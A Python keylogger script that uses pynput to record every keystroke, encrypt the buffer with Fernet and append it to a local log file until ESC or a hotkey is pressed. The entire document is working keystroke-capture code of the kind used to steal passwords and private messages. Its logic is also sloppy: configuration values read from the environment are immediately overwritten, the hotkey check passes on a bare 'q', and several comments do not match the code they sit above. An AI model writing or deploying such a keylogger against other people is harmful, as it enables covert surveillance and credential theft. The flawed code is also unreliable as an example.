import os
import time
from pynput import keyboard
from cryptography.fernet import Fernet

# Load or generate encryption key

LOG_DIR = os.environ.get('LOG_DIR', os.path.join(os.getcwd(), 'logs'))
LOG_FILE = os.environ.get('LOG_FILE', 'keylog.txt')
KEY_FILE = "encryption_key.key"
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "log.enc")

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Load encryption key
with open(KEY_FILE, "rb") as file:
    key = file.read()

fernet = Fernet(key)
buffer = ""

# Encrypt and save the buffer
def save_encrypted(buffer):
    if buffer:
        encrypted_data = fernet.encrypt(buffer.encode())
        with open(LOG_FILE, "ab") as log_file:
            log_file.write(encrypted_data + b"\n")

# Stop listener on hotkey
def on_press(key):
    global buffer
    try:
        if key.char:
            buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        else:
            buffer += f"[{key.name}]"

    # Flush buffer every 50 characters
    if len(buffer) >= 50:
        save_encrypted(buffer)
        buffer = ""

def on_release(key):
    global buffer
    # Stop keylogger on Ctrl + Shift + Q
    if key == keyboard.Key.esc or (key == keyboard.KeyCode.from_char('q') and any([
        keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
        keyboard.Key.shift
    ])):
        save_encrypted(buffer)
        print("Stopping keylogger.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... Press ESC or Ctrl+Shift+Q to stop.")
    listener.join()
print("LOG_DIR:", LOG_DIR)
print("LOG_FILE:", LOG_FILE)